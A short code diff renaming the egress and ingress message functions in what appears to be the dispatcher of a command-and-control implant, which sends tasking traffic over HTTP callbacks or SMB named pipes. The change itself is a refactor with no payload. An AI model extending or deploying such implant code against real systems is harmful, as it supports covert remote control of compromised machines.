@@ -125,7 +125,7 @@ namespace Dispatcher {
         }
     }
 
-    VOID PrepareEgressMessage(_stream *out) {
+    VOID PrepareEgress(_stream *out) {
         HEXANE
 
         _parser parser  = { };
@@ -151,7 +151,7 @@ namespace Dispatcher {
         Parser::DestroyParser(&parser);
     }
 
-    VOID PrepareIngressMessage(_stream *in) {
+    VOID PrepareIngress(_stream *in) {
         HEXANE
 
         if (in) {
@@ -189,7 +189,7 @@ namespace Dispatcher {
         }
 
         out = Stream::CreateStream();
-        Dispatcher::PrepareEgressMessage(out);
+        Dispatcher::PrepareEgress(out);
 
 #ifdef TRANSPORT_HTTP
         Network::Http::HttpCallback(out, &in);
@@ -198,7 +198,7 @@ namespace Dispatcher {
         Network::Smb::PipeReceive(&in);
 #endif
         Stream::DestroyStream(out);
-        Dispatcher::PrepareIngressMessage(in);
+        Dispatcher::PrepareIngress(in);
 
         Clients::PushClients();
     }
